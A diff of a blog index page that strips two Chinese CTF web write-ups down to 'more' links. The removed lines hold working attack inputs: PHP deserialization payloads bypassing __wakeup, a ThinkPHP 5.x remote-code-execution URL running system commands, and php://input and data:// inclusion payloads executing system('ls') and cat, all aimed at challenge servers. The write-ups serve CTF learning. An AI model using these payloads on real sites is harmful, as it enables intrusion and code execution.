@@ -204,75 +204,13 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>[toc]</p>
-<h1 id="CTF笔记-WEB攻防-02"><a href="#CTF笔记-WEB攻防-02" class="headerlink" title="CTF笔记-WEB攻防-02"></a>CTF笔记-WEB攻防-02</h1><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank" rel="noopener">Web_php_unserialize</a></h2><p>(题外话)<del>这一题觉得好难呀</del></p>
+    <h1 id="CTF笔记-WEB攻防-02"><a href="#CTF笔记-WEB攻防-02" class="headerlink" title="CTF笔记-WEB攻防-02"></a>CTF笔记-WEB攻防-02</h1><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank" rel="noopener">Web_php_unserialize</a></h2><p>(题外话)<del>这一题觉得好难呀</del></p>
 <p>访问端口:</p>
 <p><strong>output:</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>var</strong></p>
-<ol>
-<li>我们需要get传参var，var的值就是序列化后的类的base64编码</li>
-<li>在处理var时用到了正则匹配检测，含义就是匹配 <code>o或c之后跟数字加冒号的格式</code></li>
-</ol>
-<p><strong>Demo</strong></p>
-<ol>
-<li>看到了三个方法，构造器不用管，从注释看到了目标文件fl4g.php</li>
-<li>__destruct会将输入的文件输出</li>
-<li><em>\</em>wakeup则是一个防护用函数，将file强制改为index.php，因此我们需要绕过__wakeup方法</li>
-</ol>
-<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Demo"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"Demofile"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br><span class="line">=&gt;绕过正则 O:+<span class="number">4</span>:<span class="string">"Demo"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"Demofile"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br><span class="line">=&gt;绕过__wakeup() O:+<span class="number">4</span>:<span class="string">"Demo"</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">"Demofile"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="base64加密"><a href="#base64加密" class="headerlink" title="base64加密"></a>base64加密</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123; </span><br><span class="line">    private $file = &apos;index.php&apos;;</span><br><span class="line">    public function __construct($file) &#123; </span><br><span class="line">        $this-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123; </span><br><span class="line">        echo @highlight_file($this-&gt;file, true); </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123; </span><br><span class="line">        if ($this-&gt;file != &apos;index.php&apos;) &#123; </span><br><span class="line">            //the secret is in the fl4g.php</span><br><span class="line">            $this-&gt;file = &apos;index.php&apos;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">$b = new Demo(&apos;fl4g.php&apos;);</span><br><span class="line">$c = serialize($b);</span><br><span class="line">$c = str_replace(&quot;O:4&quot;, &quot;O:+4&quot;, $c);</span><br><span class="line">$c = str_replace(&quot;:1:&#123;&quot;, &quot;:2:&#123;&quot;, $c);</span><br><span class="line">echo base64_encode($c);</span><br></pre></td></tr></table></figure>
-
-<p><strong>output</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
-
-<p><strong>url</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:36436/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
-
-<h3 id="反思踩坑-gt-base64"><a href="#反思踩坑-gt-base64" class="headerlink" title="反思踩坑=&gt;base64"></a>反思踩坑=&gt;base64</h3><p>我们如果使用网页上的base64加密工具，则会出现忽略空格的问题:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64加密工具：TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30=</span><br><span class="line">php自行加密：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>在使用base64加密时，一定要构造原生php，切记使用加密工具!</p>
-</blockquote>
-<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a><a href="https://blog.csdn.net/qq_43814486/article/details/90020139" target="_blank" rel="noopener">rce</a></h3><p>访问端口，得到了tp的默认首页</p>
-<p>这里需要使用tp的 5.0-5.0.24 版本和 5.1.0-5.1.30 版本的rce漏洞进行攻击</p>
-<p><a href="https://www.cnblogs.com/nongchaoer/p/12029478.html" target="_blank" rel="noopener">攻击方法</a> =&gt; <code>这篇博客写的有点问题，我们需要将thinkapp换为think\app</code></p>
-<h3 id="url"><a href="#url" class="headerlink" title="url"></a>url</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:58615/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure>
-
-<p>在输出发现/flag文件，访问它</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:58615/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</span><br></pre></td></tr></table></figure>
-
-<p>得到了flag</p>
-<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>访问端口，得到了php代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><del>这题解法很多样的样子，看看wp能得到很多操作</del></p>
-<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h4 id="php"><a href="#php" class="headerlink" title="php://"></a><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://</a></h4><p>这里php://不分大小写，代码中只做了小写判定，所以我们可以<strong>大小写绕过</strong></p>
-<h4 id="burp拦截头信息"><a href="#burp拦截头信息" class="headerlink" title="burp拦截头信息"></a>burp拦截头信息</h4><p> – proxy – interccept =&gt;(获取到头信息后) Actions – send to repeater</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 220.249.52.133:40787</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-
-<h4 id="修改头信息"><a href="#修改头信息" class="headerlink" title="修改头信息"></a>修改头信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /?page=Php://input HTTP/1.1</span><br><span class="line">Host: 220.249.52.133:40787</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>output</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fl4gisisish3r3.php</span><br><span class="line">index.php</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure>
-
-<p>访问fl4gisisish3r3.php：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /?page=Php://input HTTP/1.1</span><br><span class="line">Host: 220.249.52.133:40787</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 42</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>得到了flag</p>
-<h3 id="使用其他协议"><a href="#使用其他协议" class="headerlink" title="使用其他协议"></a>使用其他协议</h3><h4 id="data"><a href="#data" class="headerlink" title="data://"></a><a href="https://www.php.net/manual/zh/wrappers.data.php" target="_blank" rel="noopener">data://</a></h4><h4 id="修改头信息-拦截见上"><a href="#修改头信息-拦截见上" class="headerlink" title="修改头信息(拦截见上)"></a>修改头信息(拦截见上)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:40787/?page=data://text/plain;base64,%0CPD9waHAgc3lzdGVtKCdscycpOyA/Pg== </span><br><span class="line"># &lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8+</span><br><span class="line"># &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这时候出问题了</p>
-<h4 id="url中的特殊符号"><a href="#url中的特殊符号" class="headerlink" title="url中的特殊符号"></a>url中的特殊符号</h4><p>我们需对url中的特殊符号(+, (空格), )进行<a href="http://www.ruanyifeng.com/blog/2010/02/url_encoding.html" target="_blank" rel="noopener">url编码</a>来传数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8%2b</span><br><span class="line"># &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在html注释get到了flag</p>
-
+    
+    <a class="article-more-a" href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-02/#more">more >></a>
+    
     
 
     
@@ -361,8 +299,7 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>[toc]</p>
-<h1 id="CTF笔记-WEB攻防-01"><a href="#CTF笔记-WEB攻防-01" class="headerlink" title="CTF笔记-WEB攻防-01"></a>CTF笔记-WEB攻防-01</h1><blockquote>
+    <h1 id="CTF笔记-WEB攻防-01"><a href="#CTF笔记-WEB攻防-01" class="headerlink" title="CTF笔记-WEB攻防-01"></a>CTF笔记-WEB攻防-01</h1><blockquote>
 <p>写在前面：</p>
 <ol>
 <li>此笔记系个人(初学者)整理思路之用，没有想过能起到供各位参考学习的用处。</li>
@@ -372,50 +309,9 @@
 </blockquote>
 <hr>
 <h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5411&page=1" target="_blank" rel="noopener">baby_web</a></h2><p>​    进入页面之后，重定向到了1.php，认为有问题，因此使用了网页搜索工具dirsearch</p>
-<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://220.249.52.133:40885 -e*</span><br></pre></td></tr></table></figure>
-
-<p><strong>output:</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[19:22:07] 403 -  306B  - /.htaccess.bak1</span><br><span class="line">[19:22:07] 403 -  306B  - /.htaccess.orig</span><br><span class="line">[19:22:07] 403 -  308B  - /.htaccess.sample</span><br><span class="line">[19:22:07] 403 -  306B  - /.htaccess.save</span><br><span class="line">[19:22:07] 403 -  304B  - /.htaccessBAK</span><br><span class="line">[19:22:07] 403 -  304B  - /.htaccessOLD</span><br><span class="line">[19:22:07] 403 -  305B  - /.htaccessOLD2</span><br><span class="line">[19:22:07] 403 -  303B  - /.httr-oauth</span><br><span class="line">[19:22:15] 200 -   11B  - /1.php</span><br><span class="line">[19:23:08] 302 -   17B  - /index.php  -&gt;  1.php</span><br><span class="line">[19:23:08] 302 -   17B  - /index.php/login/  -&gt;  1.php</span><br><span class="line">[19:23:30] 403 -  305B  - /server-status</span><br><span class="line">[19:23:30] 403 -  306B  - /</span><br></pre></td></tr></table></figure>
-
-<p>发现了奇怪的302信息：/index，去路由到/index康康，发现302的response中有flag，结题</p>
-<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>​    看题目知道，是关于<a href="https://www.cnblogs.com/benpao1314/p/11352276.html" target="_blank" rel="noopener">robots.txt</a>的,因此我们可以直接访问robots.txt路由/robots.txt</p>
-<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>​    <strong>output:</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
-
-<p>看到了类似于flag的路由，过去直接发现路由</p>
-<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>​    根据题目来看，这题是关于反序列化的</p>
-<p>​    访问地址：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
-
-<p>​     <del>发现这php语法错误，少一括号</del>看到了?code=，察觉到是get传参code，应该是传序列化的类，之后番序列化出flag</p>
-<p>​    我们把这个类序列化：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> xctf();</span><br><span class="line">$c = serialize($b);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br></pre></td></tr></table></figure>
-
-<p><strong>output</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>我们直接写入code参数中:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:32505/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>output</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bad requests</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这时意识到了，经过了反序列化经过了__wakeup()魔术方法，导致了bad requests被打印出来。</p>
-<h3 id="如何绕过php反序列化的-wakeup-方法呢？"><a href="#如何绕过php反序列化的-wakeup-方法呢？" class="headerlink" title="如何绕过php反序列化的__wakeup()方法呢？"></a>如何绕过php反序列化的__wakeup()方法呢？</h3><blockquote>
-<p>在反序列化的操作中，如果给出的参数数量和真正的参数数量对不上，则会跳过__wakeup()方法</p>
-</blockquote>
-<blockquote>
-<p>例如，<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>,我们若改成：<code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，给出的参数数量为2，可实际只有一个，就会绕过导致__wakeup()方法</p>
-</blockquote>
-<p>重新路由：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:32505/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>拿到了flag</p>
-
+    
+    <a class="article-more-a" href="/2020/10/01/ctf/ctf%E7%AC%94%E8%AE%B0-01/#more">more >></a>
+    
     
 
     
